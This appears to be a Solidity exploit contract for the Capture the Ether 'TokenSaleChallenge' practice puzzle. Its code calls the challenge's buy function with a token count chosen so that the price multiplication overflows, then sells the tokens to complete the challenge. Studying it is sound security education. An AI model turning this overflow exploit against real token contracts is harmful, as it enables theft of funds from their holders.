interface ITokenSaleChallenge {
    function buy(uint256 numTokens) external payable;
    function sell(uint256 numTokens) external;
    function isComplete() external view returns (bool);
}

contract Reproduction {
    ITokenSaleChallenge public vulnerableContract;
    uint256 public tokenAmount;

    constructor(address _vulnerableContract, uint256 _tokenAmount) {
        vulnerableContract = ITokenSaleChallenge(_vulnerableContract);
        tokenAmount = _tokenAmount;
    }

    function setup() public payable {
        require(msg.value == 1 ether, "Insufficient funds to start");
        vulnerableContract.buy{value: msg.value}(1); // Initial purchase to set balance
    }

    function triggerOverflow() public payable {
        uint256 requiredValue = tokenAmount * 1 ether;
        require(msg.value == requiredValue, "Incorrect Ether amount for purchase");

        vulnerableContract.buy{value: msg.value}(tokenAmount);
    }

    function sellTokens() public {
        vulnerableContract.sell(tokenAmount);
    }

    function isVulnerable() public view returns (bool) {
        return vulnerableContract.isComplete();
    }
}